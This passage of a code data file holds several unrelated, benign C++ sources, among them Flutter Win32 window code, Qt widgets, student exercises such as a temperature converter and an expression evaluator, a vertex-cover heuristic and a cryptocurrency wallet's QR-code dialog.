(!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"standardComponentInfo.h\"\n\nstandardComponentInfo::standardComponentInfo(component& coreComponent, QWidget* parent):QWidget(parent),coreComponent(coreComponent){\n    setCursor(Qt::PointingHandCursor);\n    QVBoxLayout* layout = new QVBoxLayout(this);\n\n    QLabel* name = new QLabel(\"Nome: \"+QString::fromStdString(coreComponent.getName()));\n    layout->addWidget(name);\n    QLabel* componentNumber = new QLabel(\"Numero del componente: \"+QString::fromStdString(std::to_string(coreComponent.getComponentNumber())));\n    layout->addWidget(componentNumber);\n    QLabel* numberOfInputs = new QLabel(\"Numero di input: \"+ QString::fromStdString(std::to_string(coreComponent.getNumberOfInputs())));\n    layout->addWidget(numberOfInputs);\n    QLabel* numberOfOutputs = new QLabel(\"Numero di output: \"+ QString::fromStdString(std::to_string(coreComponent.getNumberOfOutputs())));\n    layout->addWidget(numberOfOutputs);\n    QLabel* description = new QLabel(\"Descrizione: \"+QString::fromStdString(coreComponent.getDescription()));\n    description->setWordWrap(true);\n    layout->addWidget(description);\n    layout->setSpacing(0);\n}\n\nvoid standardComponentInfo::paintEvent(QPaintEvent* event){\n    QPainter painter(this);\n    painter.setBrush(Qt::white);\n    painter.drawRoundedRect(0,5,width()-5, height()-7,3,3);\n    QWidget::paintEvent(event);\n}\n\nvoid standardComponentInfo::mousePressEvent(QMouseEvent* event){\n    if(event->button() == Qt::LeftButton){\n        setCursor(Qt::ClosedHandCursor);\n        emit onPressed(coreComponent);\n    }\n    QWidget::mousePressEvent(event);\n}\n\nvoid standardComponentInfo::mouseReleaseEvent(QMouseEvent* event){\n    if(event->button() == Qt::LeftButton){\n        setCursor(Qt::PointingHandCursor);\n    }\n    QWidget::mouseReleaseEvent(event);\n}\n",
    "#include <fstream>\r\n#include <iostream>\r\n#include <sstream>\r\n#include <string>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nvector<vector<string>> weatherConditions;\r\n\r\nconst int numberOfPorts = 5;\r\n\r\nstruct SpacePort {\r\n    int perfectDay = 0;\r\n    int lengthEquator = 0;\r\n    int lowestTemps = 1;\r\n    int maxTemps = 32;\r\n    int maxWindSpeed = 11;\r\n    int maxHumidity = 55;\r\n    int maxPrecipitation = 0;\r\n    string lightning = \"No\";\r\n    string cloudsFirst = \"Cumulus\";\r\n    string cloudsSecond = \"Nimbus\";\r\n    string csvFileName;\r\n    string name;\r\n\r\n};\r\n\r\nvoid CreateFile(vector<SpacePort> ports) {\r\n    ofstream outputFile(\"LaunchAnalysisReport.csv\");\r\n    if (!outputFile) {\r\n        cout << \"Error creating file\" << endl;\r\n        return;\r\n    }\r\n    outputFile << \"Port name,Date\" << endl;\r\n\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        outputFile << ports[i].name << \",\";\r\n        if (ports[i].perfectDay == 0) {\r\n            outputFile << \"No viable shuffle day\" << endl;\r\n        }\r\n        else {\r\n            outputFile << ports[i].perfectDay << endl;\r\n        }\r\n    }\r\n    outputFile.close();\r\n}\r\n\r\nvoid GetWeatherConditions(const string fileName) {\r\n    ifstream File(fileName);\r\n    if (!File.is_open()) {\r\n        cout << \"Unable to open file\" << endl;\r\n        return;\r\n    }\r\n    string line;\r\n    string word;\r\n    while (getline(File, line)) {\r\n        stringstream ss(line);\r\n        vector<string> row;\r\n        getline(ss, word, ',');\r\n        while (getline(ss, word, ',')) {\r\n            row.push_back(word);\r\n        }\r\n        weatherConditions.push_back(row);\r\n    }\r\n    File.close();\r\n}\r\n\r\nint GetAppropriateDays(SpacePort port) {\r\n    const size_t numberOfDays = weatherConditions[0].size();\r\n\r\n    for (size_t i = 0; i < numberOfDays; i++) {\r\n        if (stoi(weatherConditions[1][i]) > port.lowestTemps &&\r\n            stoi(weatherConditions[1][i]) < port.maxTemps &&\r\n            stoi(weatherConditions[2][i]) < port.maxWindSpeed &&\r\n            stoi(weatherConditions[3][i]) < port.maxHumidity &&\r\n            stoi(weatherConditions[4][i]) == port.maxPrecipitation &&\r\n            weatherConditions[5][i] == port.lightning &&\r\n            weatherConditions[6][i] != port.cloudsFirst &&\r\n            weatherConditions[6][i] != port.cloudsSecond) {\r\n            return i + 1;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\nvoid GetBestDay(vector<SpacePort>& ports) {\r\n    int day = 0;\r\n    for (size_t i = 0; i < numberOfPorts;i++) {\r\n        GetWeatherConditions(ports[i].csvFileName);\r\n        day = GetAppropriateDays(ports[i]);\r\n        ports[i].perfectDay = day;\r\n        weatherConditions.clear();\r\n    }\r\n}\r\n\r\nvoid GetPerfectDayAndLocation(vector<SpacePort> ports) {\r\n    int port = -1;\r\n    int currentMaxLength = 999999;\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        if (ports[i].perfectDay != 0 && ports[i].lengthEquator <= currentMaxLength) {\r\n            port = i;\r\n            currentMaxLength = ports[i].lengthEquator;\r\n        }\r\n    }\r\n    if (port != -1) {\r\n        cout << \"Perfect location and day:\" << endl;\r\n        cout << ports[port].name << \"  day: \" << ports[port].perfectDay;\r\n    }\r\n    else {\r\n        cout << \"There are no appropriate days\";\r\n    }\r\n}\r\n\r\n\r\n\r\nint main() {\r\n    string portNames[numberOfPorts] = { \"Kourou\", \"Tenegashima\", \"Cape Canaveral\", \"Mahia\", \"Kodiak\" };\r\n    int arr[numberOfPorts] = { 333, 1934, 1807, 2500, 4112 };\r\n    vector<SpacePort> spacePorts(numberOfPorts);\r\n\r\n    cout << \"Enter file path\" << endl;\r\n    string fileName;\r\n    getline(cin, fileName);\r\n\r\n    string choice;\r\n    cout << \"Do you want to use default weather criteria? (Yes/No): \";\r\n    cin >> choice;\r\n\r\n    SpacePort port;\r\n    for (size_t i = 0; i < numberOfPorts; i++) {\r\n        port.name = portNames[i];\r\n        port.csvFileName = fileName + \"\\\\\" + portNames[i] + \".csv\";\r\n        port.lengthEquator = arr[i];\r\n        spacePorts[i] = port;\r\n    }\r\n\r\n    if (choice == \"No\") {\r\n        int numberOfPortsToChange;\r\n        while (true) {\r\n            cout << \"How many port's criteria do you want to change?\" << endl;\r\n            cin >> numberOfPortsToChange;\r\n\r\n            if (numberOfPortsToChange > numberOfPorts && numberOfPortsToChange<0 && !numberOfPortsToChange) {\r\n                cout << \"Invalid input\" << endl;\r\n            }\r\n            else {\r\n                break;\r\n            }\r\n        }\r\n       \r\n            string portName;\r\n            bool isValid = false;\r\n            for (size_t j = 0; j < numberOfPortsToChange; j++) {\r\n                cout << \"Enter the name of the port to change criteria: \";\r\n                cin >> portName;\r\n\r\n                for (int i = 0; i < numberOfPorts; i++) {\r\n                    if (portName == portNames[i]) {\r\n                        cout << \"Enter lowest temperature: \";\r\n                        cin >> spacePorts[i].lowestTemps;\r\n\r\n                        cout << \"Enter maximum temperature: \";\r\n                        cin >> spacePorts[i].max",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct Graph\r\n{\r\n    int V; //Number of vertices\r\n    vector<unordered_set<char>> adj; //Adjacency list\r\n\r\n    Graph(int V) : V(V) \r\n    {\r\n        adj.resize(V);\r\n    }\r\n\r\n    //Function to add an edge to the graph\r\n    void addEdge(char u, char v) \r\n    {\r\n        adj[u - 'a'].insert(v);\r\n    }\r\n\r\n    //Function to find pendant vertices\r\n    set<char> findPendantVertices() \r\n    {\r\n        set<char> pendantVertices;\r\n        for (char u = 'a'; u < 'a' + V; ++u) {\r\n            if (adj[u - 'a'].size() == 1) { // Check if vertex u is a pendant vertex\r\n                pendantVertices.insert(u);\r\n            }\r\n        }\r\n        return pendantVertices;\r\n    }\r\n\r\n    //Function to find the maximum degree vertex\r\n    vector<char> findMaxDegreeVertex() {\r\n        int maxDegree = 0;\r\n        vector<char> maxDegreeVertices;\r\n\r\n        for (char u = 'a'; u < 'a' + V; ++u)\r\n        {\r\n            if (adj[u - 'a'].size() > maxDegree) \r\n            {\r\n                maxDegree = adj[u - 'a'].size();\r\n                maxDegreeVertices.clear();\r\n                maxDegreeVertices.push_back(u);\r\n            } \r\n            else if(adj[u - 'a'].size() == maxDegree) \r\n            {\r\n                maxDegreeVertices.push_back(u);\r\n            }\r\n        }\r\n        return maxDegreeVertices;\r\n    }\r\n\r\n    // Function to remove a vertex and its incident edges from the graph\r\n    void removeEdgeVertex(set<pair<char, char>> &E, char &u)\r\n    {\r\n        vector<pair<char, char>> toRemove;\r\n        for(auto it:E)\r\n        {\r\n            if(it.first == u || it.second == u)\r\n                toRemove.push_back(it);\r\n        }\r\n        for(auto it:toRemove)\r\n        {\r\n            E.erase(it);\r\n        }\r\n\r\n        for (char v : adj[u - 'a']) {\r\n            adj[v - 'a'].erase(u);\r\n        }\r\n        adj[u - 'a'].clear();\r\n\r\n    }\r\n\r\n    //Function to compute the vertex cover using SD(G) algorithm\r\n    set<char> findVertexCover() {\r\n        set<char> VC; // Vertex cover\r\n        set<pair<char, char>> E; // Set of remaining edges\r\n\r\n        // Initialize E with all edges\r\n        for (char u = 'a'; u < 'a' + V; ++u)\r\n        {\r\n            for (char v : adj[u - 'a'])\r\n            {\r\n                E.insert({u,v});\r\n            }\r\n        }\r\n\r\n        set<char> P = findPendantVertices(); // Set of pendant vertices\r\n        \r\n        // Step 5: While P is not empty\r\n        while(!P.empty())\r\n        {\r\n            // Step 7: Select any vertex u from P\r\n            char u = *P.begin();\r\n            // Step 8: Get an adjacent vertex v\r\n            char v = *adj[u - 'a'].begin();\r\n            // Step 9: Add v to VC\r\n            VC.insert(v);\r\n            /*\r\n            cout<<\"Added:\"<<v<<endl;\r\n            */\r\n            // Step 10: Remove edges incident on v\r\n            removeEdgeVertex(E, v);\r\n            // Update P and E\r\n            P = findPendantVertices();\r\n        }\r\n\r\n        // Step 13: While E is not empty\r\n        while (!E.empty()) {\r\n            // Step 15: Find maximum degree vertex\r\n            vector<char> maxDegreeVertices = findMaxDegreeVertex();\r\n\r\n            /*\r\n            cout<<\"Max degree vertices are: \"<<endl;\r\n            for(auto max: maxDegreeVertices){\r\n            \tcout<<max<<\" \";\r\n            }\r\n            cout<<endl;\r\n            */\r\n\r\n            // Step 18: Choose the maximum degree vertex that covers a unique edge among all maximum degree vertices\r\n\t\t\tchar m = maxDegreeVertices[0]; // Initialize with the first vertex in the list\r\n\t\t\tbool found = false;\r\n\r\n\t\t\t// Iterate over each maximum degree vertex\r\n\t\t\tfor (char u : maxDegreeVertices)\r\n            {\r\n\t\t\t    // Check if the current vertex covers a unique edge\r\n\t\t\t    bool uniqueEdge = false;\r\n\t\t\t    for (char i : adj[u-'a'])\r\n                {\r\n                    int flag = 1;\r\n\t\t\t        for(char v : maxDegreeVertices)\r\n                    {\r\n                        if(v != u && adj[v-'a'].find(i) != adj[v-'a'].end())\r\n                        {\r\n                            flag = 0;\r\n                            break;\r\n                        }\r\n                    }\r\n\r\n                    if(flag == 1)\r\n                    {\r\n                        uniqueEdge = true;\r\n                        break;\r\n                    }\r\n\t\t\t    }\r\n\r\n\t\t\t    // If the current vertex covers a unique edge, update the chosen vertex\r\n\t\t\t    if (uniqueEdge)\r\n                {\r\n\t\t\t        m = u;\r\n\t\t\t        found = true;\r\n\t\t\t        break;\r\n\t\t\t    }\r\n\t\t\t}\r\n\r\n\t\t\t// If no maximum degree vertex covers a unique edge, choose the first vertex in the list\r\n\t\t\tif(!found)\r\n            {\r\n\t\t\t    m = maxDegreeVertices[0];\r\n            }\r\n\r\n            // Step 19: Add m to VC\r\n            VC.insert(m);\r\n            cout<<\"v:\"<<m<<endl;\r\n\r\n            // Step 20: Remove edges incident on m\r\n            removeEdgeVertex(E, m);\r\n        }\r\n\r\n        return VC;\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    /*\r\n    map<char,set<char>> mp = {\r\n    {'a",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\nclass Complex{\n    double a,b;\n\npublic:\nComplex(double deist, double mnim);\nComplex operator+(Complex ob);\nComplex operator-(Complex ob);\nComplex operator/(Complex ob);\ndouble Module_2();\nvoid Module_1();\ndouble Argument();\nvoid Print();\ndouble get_a(){return a;}\ndouble get_b(){return b;}\nvoid set_a(double value_a){\n        a=value_a;\n    }\nvoid set_b(double value_b){\n        b=value_b;\n    }\n};\n\nComplex::Complex(double deist=0, double mnim=0){\n        a=deist;\n        b=mnim;\n}\n\nComplex Complex::operator+(Complex ob){\n        Complex result(0,0);\n        result.a=a+ob.a;\n        result.b=b+ob.b;\n        return result;\n}\n\nComplex Complex::operator-(Complex ob){\n        Complex result;\n        result.a=a-ob.a;\n        result.b=b-ob.b;\n        return result;\n}\n\nComplex Complex::operator/(Complex ob){\n        Complex result;\n        result.a = (a*ob.a + b*ob.b)/pow(ob.a, 2)+pow(ob.a, 2);\n        result.b = (ob.a*b - a*ob.b)/pow(ob.a, 2)+pow(ob.b, 2);\n        return result;\n    }\n\ndouble Complex::Module_2(){\n        double i=pow(a, 2)+pow(b, 2);\n        return sqrt(i);\n}\n\nvoid Complex::Module_1(){\n        double i=pow(a, 2)+pow(b, 2);\n        cout<<sqrt(i)<<endl;\n}\n\ndouble Complex::Argument(){\n        return atan(a/b);\n}\n\nvoid Complex::Print(){\n        cout<<a<<endl;\n        cout<<b<<endl;\n}\n\n\nint main(){\n    Complex n1(3, 4);\n    Complex n2(1.4, 1.5);\n    Complex n3(1.6, 1.7);\n    Complex n4(0, 0);\n    Complex n5;\n    n4=n1+n1;\n    n4.Print();\n\n    n1.Module_1();\n    cout<<n1.Module_2()<<endl;\n    cout<<n1.Argument()<<endl;\n\n    n5 = n1 + n2;\n    n5.Print();\n\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <stack>\n#include <string>\n#include <sstream>\n\nusing namespace std;\n\n// Ki\u1ec3m tra xem m\u1ed9t k\u00fd t\u1ef1 c\u00f3 ph\u1ea3i l\u00e0 to\u00e1n t\u1eed hay kh\u00f4ng\nbool isOperator(char c) {\n    return (c == '+' || c == '-' || c == '*' || c == '/');\n}\n\n// Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n cho hai to\u00e1n h\u1ea1ng v\u00e0 m\u1ed9t to\u00e1n t\u1eed\ndouble performOperation(char op, double operand1, double operand2) {\n    switch (op) {\n        case '+':\n            return operand1 + operand2;\n        case '-':\n            return operand1 - operand2;\n        case '*':\n            return operand1 * operand2;\n        case '/':\n            if (operand2 != 0) // Ki\u1ec3m tra chia cho 0\n                return operand1 / operand2;\n            else {\n                cerr << \"Loi: chia cho 0\\n\";\n                exit(EXIT_FAILURE);\n            }\n        default:\n            cerr << \"Loi: toan tu khong hop le\\n\";\n            exit(EXIT_FAILURE);\n    }\n}\n\n// T\u00ednh to\u00e1n bi\u1ec3u th\u1ee9c s\u1ed1 h\u1ecdc\ndouble evaluateExpression(string expression) {\n    stack<double> operandStack; // Stack \u0111\u1ec3 l\u01b0u tr\u1eef c\u00e1c to\u00e1n h\u1ea1ng\n    stack<char> operatorStack; // Stack \u0111\u1ec3 l\u01b0u tr\u1eef c\u00e1c to\u00e1n t\u1eed\n\n    stringstream ss(expression);\n    string token;\n    while (getline(ss, token, ' ')) { // T\u00e1ch bi\u1ec3u th\u1ee9c th\u00e0nh c\u00e1c token\n        if (token.empty()) continue; // B\u1ecf qua c\u00e1c kho\u1ea3ng tr\u1eafng kh\u00f4ng c\u1ea7n thi\u1ebft\n\n        if (isdigit(token[0])) { // N\u1ebfu l\u00e0 to\u00e1n h\u1ea1ng\n            double operand = stod(token);\n            operandStack.push(operand);\n        } else if (isOperator(token[0])) { // N\u1ebfu l\u00e0 to\u00e1n t\u1eed\n            while (!operatorStack.empty() && \n                   operatorStack.top() != '(' &&\n                   ((token[0] != '*' && token[0] != '/') ||\n                   (operatorStack.top() != '+' && operatorStack.top() != '-'))) {\n                // Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n n\u1ebfu \u0111\u1ed9 \u01b0u ti\u00ean c\u1ee7a to\u00e1n t\u1eed tr\u00ean c\u00f9ng trong stack cao h\u01a1n\n                char op = operatorStack.top();\n                operatorStack.pop();\n\n                double operand2 = operandStack.top();\n                operandStack.pop();\n\n                double operand1 = operandStack.top();\n                operandStack.pop();\n\n                double result = performOperation(op, operand1, operand2);\n                operandStack.push(result);\n            }\n            operatorStack.push(token[0]);\n        } else if (token[0] == '(') { // N\u1ebfu l\u00e0 d\u1ea5u ngo\u1eb7c m\u1edf\n            operatorStack.push(token[0]);\n        } else if (token[0] == ')') { // N\u1ebfu l\u00e0 d\u1ea5u ngo\u1eb7c \u0111\u00f3ng\n            while (!operatorStack.empty() && operatorStack.top() != '(') {\n                char op = operatorStack.top();\n                operatorStack.pop();\n\n                double operand2 = operandStack.top();\n                operandStack.pop();\n\n                double operand1 = operandStack.top();\n                operandStack.pop();\n\n                double result = performOperation(op, operand1, operand2);\n                operandStack.push(result);\n            }\n            if (!operatorStack.empty() && operatorStack.top() == '(')\n                operatorStack.pop(); // Lo\u1ea1i b\u1ecf d\u1ea5u ngo\u1eb7c m\u1edf kh\u1ecfi stack\n        } else {\n            cerr << \"Loi: bieu thuc khong hop le\\n\";\n            exit(EXIT_FAILURE);\n        }\n    }\n\n    // Th\u1ef1c hi\u1ec7n ph\u00e9p to\u00e1n c\u00f2n l\u1ea1i (n\u1ebfu c\u00f3)\n    while (!operatorStack.empty()) {\n        char op = operatorStack.top();\n        operatorStack.pop();\n\n        double operand2 = operandStack.top();\n        operandStack.pop();\n\n        double operand1 = operandStack.top();\n        operandStack.pop();\n\n        double result = performOperation(op, operand1, operand2);\n        operandStack.push(result);\n    }\n\n    // K\u1ebft qu\u1ea3 cu\u1ed1i c\u00f9ng l\u00e0 to\u00e1n h\u1ea1ng duy nh\u1ea5t c\u00f2n l\u1ea1i tr\u00ean stack\n    return operandStack.top();\n}\n\nint main() {\n    string expression;\n    cout << \"Nhap bieu thuc so hoc: \";\n    getline(cin, expression);\n\n    double result = evaluateExpression(expression);\n    cout << \"Ket qua: \" << result << endl;\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\n\nint main()\n{\n    int islem;\n    float derece;\n    float sonuc;\n    std::cout << \"************************************\\n\";\n    std::cout << \"Yapilacak islemi secin.\\n\";\n    std::cout << \"************************************\\n\";\n    std::cout << \"1. Celsius to Fahrenheit\\n\";\n    std::cout << \"2. Celsius to Kelvin\\n\";\n    std::cout << \"3. Fahrenheit to Celsius\\n\";\n    std::cout << \"4. Fahrenheit to Kelvin\\n\";\n    std::cout << \"5. Kelvin to Celsius\\n\";\n    std::cout << \"6. Kelvin to Fahrenheit\\n\";\n    std::cout << \"************************************\\n\";\n    std::cout << \"Islem:\";\n    std::cin >> islem;\n    std::cout << \"************************************\\n\";\n    std::cout << \"Havanin kac derece oldugunu girin:\";\n    std::cin >> derece;\n\n    if (islem == 1) {\n        sonuc = (derece * 9 / 5) + 32;\n        std::cout << derece <<\"\u00b0C \" << sonuc<< \"\u00b0F degerine esittir.\";\n    }\n    else if (islem == 2) {\n        sonuc = derece + 273.15;\n        std::cout << derece <<  \"\u00b0C \" << sonuc << \"K degerine esittir.\";\n    }\n    else if (islem == 3) {\n        sonuc = (derece - 32) * 5 / 9;\n        std::cout << derece << \"\u00b0F \" << sonuc << \"\u00b0C degerine esittir.\";\n    }\n    else if (islem == 4) {\n        sonuc = (derece - 32) * 5 / 9 + 273.15;\n        std::cout << derece << \"\u00b0F \" << sonuc << \"K degerine esittir.\";\n    }\n    else if (islem == 5) {\n        sonuc = derece - 273.15;\n        std::cout << derece << \"K \" << sonuc << \"\u00b0C degerine esittir.\";\n    }\n    else if (islem == 6) {\n        sonuc = (derece - 273.15) * 9 / 5 + 32;\n        std::cout << derece << \"K \" << sonuc << \"\u00b0F degerine esittir.\";\n    }\n    else {\n        std::cout << \"Hatal\u0131 i\u015flem yapt\u0131n\u0131z.\";\n    }\n\n}\n\n",
    "#include \"qrcodedialog.h\"\n#include \"ui_qrcodedialog.h\"\n\n#include \"bitcoinunits.h\"\n#include \"dialogwindowflags.h\"\n#include \"guiconstants.h\"\n#include \"guiutil.h\"\n#include \"optionsmodel.h\"\n\n#include <QPixmap>\n#include <QUrl>\n\n#include <qrencode.h>\n\nQRCodeDialog::QRCodeDialog(const QString &addr, const QString &label, bool enableReq, QWidget *parent) :\n    QDialog(parent, DIALOGWINDOWHINTS),\n    ui(new Ui::QRCodeDialog),\n    model(0),\n    address(addr)\n{\n    if(! ui) {\n        throw std::runtime_error(\"QRCodeDialog Failed to allocate memory.\");\n    }\n\n    ui->setupUi(this);\n\n    setWindowTitle(QString(\"%1\").arg(address));\n\n    ui->chkReqPayment->setVisible(enableReq);\n    ui->lblAmount->setVisible(enableReq);\n    ui->lnReqAmount->setVisible(enableReq);\n\n    ui->lnLabel->setText(label);\n\n    ui->btnSaveAs->setEnabled(false);\n\n    genCode();\n}\n\nQRCodeDialog::~QRCodeDialog()\n{\n    delete ui;\n}\n\nvoid QRCodeDialog::setModel(OptionsModel *model)\n{\n    this->model = model;\n\n    if (model) {\n        connect(model, SIGNAL(displayUnitChanged(int)), this, SLOT(updateDisplayUnit()));\n    }\n\n    // update the display unit, to not use the default (\"BTC\")\n    updateDisplayUnit();\n}\n\nvoid QRCodeDialog::genCode()\n{\n    QString uri = getURI();\n\n    if (uri != \"\") {\n        ui->lblQRCode->setText(\"\");\n\n        QRcode *code = QRcode_encodeString(uri.toUtf8().constData(), 0, QR_ECLEVEL_L, QR_MODE_8, 1);\n        if (! code) {\n            ui->lblQRCode->setText(tr(\"Error encoding URI into QR Code.\"));\n            return;\n        }\n\n        myImage = QImage(code->width + 8, code->width + 8, QImage::Format_RGB32);\n        myImage.fill(0xffffff);\n        unsigned char *p = code->data;\n        for (int y = 0; y < code->width; y++)\n        {\n            for (int x = 0; x < code->width; x++)\n            {\n                myImage.setPixel(x + 4, y + 4, ((*p & 1) ? 0x0 : 0xffffff));\n                p++;\n            }\n        }\n        QRcode_free(code);\n\n        ui->lblQRCode->setPixmap(QPixmap::fromImage(myImage).scaled(300, 300));\n\n        ui->outUri->setPlainText(uri);\n    }\n}\n\nQString QRCodeDialog::getURI()\n{\n    QString ret = QString(\"SorachanCoin:%1\").arg(address);\n    int paramCount = 0;\n\n    ui->outUri->clear();\n\n    if (ui->chkReqPayment->isChecked()) {\n        if (ui->lnReqAmount->validate()) {\n            // even if we allow a non BTC unit input in lnReqAmount, we generate the URI with BTC as unit (as defined in BIP21)\n            ret += QString(\"?amount=%1\").arg(BitcoinUnits::format(BitcoinUnits::BTC, ui->lnReqAmount->value()));\n            paramCount++;\n        } else {\n            ui->btnSaveAs->setEnabled(false);\n            ui->lblQRCode->setText(tr(\"The entered amount is invalid, please check.\"));\n            return QString(\"\");\n        }\n    }\n\n    if (! ui->lnLabel->text().isEmpty()) {\n        QString lbl(QUrl::toPercentEncoding(ui->lnLabel->text()));\n        ret += QString(\"%1label=%2\").arg(paramCount == 0 ? \"?\" : \"&\").arg(lbl);\n        paramCount++;\n    }\n\n    if (! ui->lnMessage->text().isEmpty()) {\n        QString msg(QUrl::toPercentEncoding(ui->lnMessage->text()));\n        ret += QString(\"%1message=%2\").arg(paramCount == 0 ? \"?\" : \"&\").arg(msg);\n        paramCount++;\n    }\n\n    // limit URI length to prevent a DoS against the QR-Code dialog\n    if (ret.length() > MAX_URI_LENGTH) {\n        ui->btnSaveAs->setEnabled(false);\n        ui->lblQRCode->setText(tr(\"Resulting URI too long, try to reduce the text for label / message.\"));\n        return QString(\"\");\n    }\n\n    ui->btnSaveAs->setEnabled(true);\n    return ret;\n}\n\nvoid QRCodeDialog::on_lnReqAmount_textChanged()\n{\n    genCode();\n}\n\nvoid QRCodeDialog::on_lnLabel_textChanged()\n{\n    genCode();\n}\n\nvoid QRCodeDialog::on_lnMessage_textChanged()\n{\n    genCode();\n}\n\nvoid QRCodeDialog::on_btnSaveAs_clicked()\n{\n    QString fn = GUIUtil::getSaveFileName(this, tr(\"Save QR Code\"), QString(), tr(\"PNG Images (*.png)\"));\n    if (! fn.isEmpty()) {\n        myImage.scaled(EXPORT_IMAGE_SIZE, EXPORT_IMAGE_SIZE).save(fn);\n    }\n}\n\nvoid QRCodeDialog::on_chkReqPayment_toggled(bool fChecked)\n{\n    if (! fChecked) {\n        // if chkReqPayment is not active, don't display lnReqAmount as invalid\n        ui->lnReqAmount->setValid(true);\n    }\n\n    genCode();\n}\n\nvoid QRCodeDialog::updateDisplayUnit()\n{\n    if (model) {\n        // Update lnReqAmount with the current unit\n        ui->lnReqAmount->setDisplayUnit(model->getDisplayUnit());\n    }\n}\n",
    "#include \"input_handler.hpp\"\n\nnamespace core \n{\n    InputHandler::InputHandler(void)\n    {\n        for (int i{}; i < MAX_KEYS; ++i)\n        {\n            previous_keys[i] = current_keys[i] = false;\n        }\n    }\n\n    bool InputHandler::GetKeyTriggered(KeyCode key_code) const\n    {\n        return current_keys.test(key_code) && previous_keys.test(key_code) == false;\n    }\n\n    bool InputHandler::GetKeyDown(KeyCode key_code) const\n    {\n        return current_keys.test(key_code);\n    }\n\n    bool InputHandler::GetKeyUp(KeyCode key_code) const\n    {\n        return current_keys.test(key_code) == false && previous_keys.test(key_code);\n    }\n\n    void InputHandler::Update(void)\n    {\n        previous_keys = current_keys;\n\n        current_keys.reset();\n\n        while (_kbhit())\n        {\n            int key = _getch();\n\n            if (key >= 0 && key < MAX_KEYS)\n            {\n                if (key >= 'a' && key <= 'z') \n                {\n                    key += 'A' - 'a';\n                }\n\n                current_keys.set(key);\n            }\n        }\n    }\n}",
